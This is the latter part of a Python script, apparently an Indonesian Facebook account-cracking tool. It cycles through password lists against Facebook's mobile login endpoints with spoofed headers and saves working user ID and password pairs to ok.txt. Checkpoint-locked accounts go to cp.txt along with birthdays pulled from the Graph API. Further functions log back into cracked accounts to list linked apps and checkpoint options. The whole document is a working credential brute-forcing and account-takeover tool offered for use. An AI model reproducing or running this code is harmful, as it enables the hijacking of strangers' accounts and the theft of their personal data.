		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		jeeckxnano = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[O] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [C] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [C] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobile(uid, jeeck_X_nano):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r \033[0;00m[Cracking] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in jeeck_X_nano:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		jeeckxnano = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[O] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [C] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [C] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def hasil():
	if len(ok) != 0 or len(cp) != 0:
		exit(jeeck.jeeckgantenkxxbrutallxxzzzzzzzzz___())
	else:
		exit("\n%s [%s•%s] Deteksi 0 Goblok :V\n%s [%s!%s] Mungkin Lu Belum Crack Cook"%(p,b,p,p,m,p))

def jeeckgantenkxxbrutallxxzzzzzzzzz___():
    global token
    ___jeeck___x___nanoganz___ = raw_input("\n %s[%s•%s] Check Option Account Sesi? y/n\n%s [%s•%s] Choose: "%(p,b,p,p,b,p))
    if ___jeeck___x___nanoganz___ in ["y","Y"]:
        ___jeeck___opsi___chek___()
    elif ___jeeck___x___nanoganz___ in ["n","N"]:
        os.remove('checkcp.txt')
        menu()
    else: 
        exit("\n%s [%s!%s] Pilih dengan benar cook :V"%(p,m,p))




def ___jeeck___opsi___chek___():
	files = ("checkcp.txt")
	try:
		jeeck_opsi = open(files, "r").readlines()
	except IOError:
		exit("\n%s [%s!%s] Files %s%s%s Tidak Ada!"%(p,m,p,h,files,p))
	for jeeckgantenk in jeeck_opsi:
		jeeckxnank = jeeckgantenk.replace("\n","")
		jecko  = jeeckxnank.split(" • ")
		print("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Account : "+(jeeckxnank.replace(" + ","")))
		try:
			_jeeck_sclu_debeast_(jecko[0].replace(" + ",""), jecko[1])
		except requests.exceptions.ConnectionError:
			pass
	os.remove('checkcp.txt')
	exit("\n%s [%s!%s] Chek opsi selesai cook:V"%(p,m,p))

def _jeeck_sclu_debeast_(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/Berhasils/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Total Opsi   "+str(len(ngew)))
		for opt in range(len(ngew)):
			print(" [\033[1;36m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(p,m,p,oh))
	else:
		print("%s[%s!%s]Eror Saat Login Cook Mungkin Dah Di Ganti Password\n"%(p,m,p))


def ___jeeck___opsinetiliki___():
	files = raw_input("\n %s[%s•%s] Masukan file \n %s[%s•%s] Files: "%(p,b,p,p,b,p))
	try:
		jeeck_opsi = open(files, "r").readlines()
	except IOError:
		exit("\n%s [%s!%s] Files %s%s%s Tidak Ada!"%(p,m,p,h,files,p))
	for jeeckgantenk in jeeck_opsi:
		jeeckxnank = jeeckgantenk.replace("\n","")
		jecko  = jeeckxnank.split("|")
		print("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Account : "+(jeeckxnank.replace(" + ","")))
		try:
			___jeeck___results___chek___cook___(jecko[0].replace(" + ",""), jecko[1])
		except requests.exceptions.ConnectionError:
			pass
	os.remove('cp.txt')
	exit("\n%s [%s!%s] Chek opsi selesai cook:V"%(p,m,p))

def ___jeeck___results___chek___cook___(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/Berhasils/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Total Opsi   "+str(len(ngew)))
		for opt in range(len(ngew)):
			print(" [\033[1;36m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(p,m,p,oh))
	else:
		print("%s[%s!%s]Eror Saat Login Cook Mungkin Dah Di Ganti Password\n"%(p,m,p))



def ___jeeck___tilikihasile___():
    global token
    cek_ok = open("ok.txt","r").read()
    cek_cp = open("cp.txt","r").read()
    print("\n %s[%s1%s] Cek ok hasil crack\n %s[%s2%s] Cek cp hasil crack\n %s[%s0%s] Back to menu"%(p,b,p,p,b,p,p,b,p))
    _xxcode_jeeckxnano_ = raw_input("\n%s [%s•%s] Choose: "%(p,b,p))
    if _xxcode_jeeckxnano_ in ["1","01"]:
        if len(cek_ok) != 0:
            print("\n %s[%sCehek hasil  ok %s]%s\n"%(b,p,b,p));os.system("cat ok.txt")
        else:
            print("\n %s[%s!%s] Makanya kerja baru dapet penghasilan "%(p,m,p));os.sys.exit()
    elif _xxcode_jeeckxnano_ in ["2","02"]:
        if len(cek_cp) != 0:
            print("\n %s[%s Chek hasil cp %s]%s\n"%(b,p,b,p));os.system("cat cp.txt")
        else:
            print("\n %s[%s!%s] Makanya kerja baru dapet penghasilan"%(p,m,p));os.sys.exit()
    elif _xxcode_jeeckxnano_ in ["0","00"]:
        menu()
    else: 
        exit("\n%s [%s!%s] Pilih dengan benar cook :V"%(p,m,p))

def Berhasil():
    global token
    print("\n%s [%s1%s] Ganti user agent sendiri\n %s[%s2%s] Cek user agent sekarang"%(p,b,p,p,b,p))
    _jeeck_xnano_xxzy_ = raw_input("\n%s [%s•%s] Choose: "%(p,b,p))
    if _jeeck_xnano_xxzy_ in ["1","01"]:
        user_jeeckxnano = raw_input("\n%s [%s•%s] Masuk user agent mu\n %s[%s•%s] User agent: "%(p,b,p,p,b,p))
        print("%s [%s•%s] Proses cok sabar.........!"%(p,b,p));time.sleep(1.5)
        open("ua","w").write(user_jeeckxnano)
        print("%s [%s•%s] Berhasil set user agent"%(p,b,p))
        raw_input("%s [Back]"%(p))
        menu()
    elif _jeeck_xnano_xxzy_ in ["2","02"]:
        try:
            ua = open("ua", "r").read()
        except IOError:
            ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
        print("%s [%s•%s] User agent sekrng: %s"%(p,b,p,ua))
        raw_input("%s [Back]"%(p))
        menu()

def ___chek______jeeck___tilikihasile______jeeck___():
    try:
        open("ok.txt","r").read()
    except Exception as e:
        os.system("touch ok.txt")
    try:
        open("cp.txt","r").read()
    except Exception as e:
        os.system("touch cp.txt")

if __name__=="__main__":
    os.system("git pull")
    os.system("touch login.txt")
    ___chek______jeeck___tilikihasile______jeeck___()
    menu()

